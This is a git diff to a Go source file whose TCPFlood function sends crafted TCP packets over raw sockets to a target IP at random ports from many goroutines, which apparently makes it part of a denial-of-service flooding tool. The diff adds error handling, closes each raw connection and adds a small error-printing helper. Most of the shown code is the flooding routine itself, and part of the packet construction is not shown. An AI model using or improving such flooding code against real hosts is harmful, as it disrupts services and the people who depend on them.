@@ -1,6 +1,7 @@
 package jobs
 
 import (
+	"fmt"
 	"math/rand"
 	"net"
 	"time"
@@ -60,7 +61,10 @@ func makePacket(destPortSrc int, destIP net.IP) (*ipv4.Header, []byte) {
 	ipHeaderBuffer := gopacket.NewSerializeBuffer()
 	ipPacket.SerializeTo(ipHeaderBuffer, sOpts)
 
-	ipHeader, _ := ipv4.ParseHeader(ipHeaderBuffer.Bytes())
+	ipHeader, err := ipv4.ParseHeader(ipHeaderBuffer.Bytes())
+	if err != nil {
+		handleErr(err)
+	}
 
 	tcpBuffer := gopacket.NewSerializeBuffer()
 
@@ -82,13 +86,25 @@ func TCPFlood(destIPStr string, totalPacketToSend int) {
 		go func(tcpPorts []int, destIP net.IP) {
 			// making the packet with a random port from list and dest IP
 			ipHeader, packetBytes := makePacket(tcpPorts[rand.Intn(len(tcpPorts))], destIP)
-			packetConn, _ := net.ListenPacket("ip4:tcp", "127.0.0.1")
+			packetConn, err := net.ListenPacket("ip4:tcp", "127.0.0.1")
+			if err != nil {
+				handleErr(err)
+			}
 
-			rawConn, _ := ipv4.NewRawConn(packetConn)
+			rawConn, err := ipv4.NewRawConn(packetConn)
+			if err != nil {
+				handleErr(err)
+			}
 
 			rawConn.WriteTo(ipHeader, packetBytes, nil)
+
+			rawConn.Close()
 
 		}(tcpPorts, destIP)
 	}
 
+}
+
+func handleErr(message error) {
+	fmt.Println("TCPFLOOD error: " + message.Error())
 }
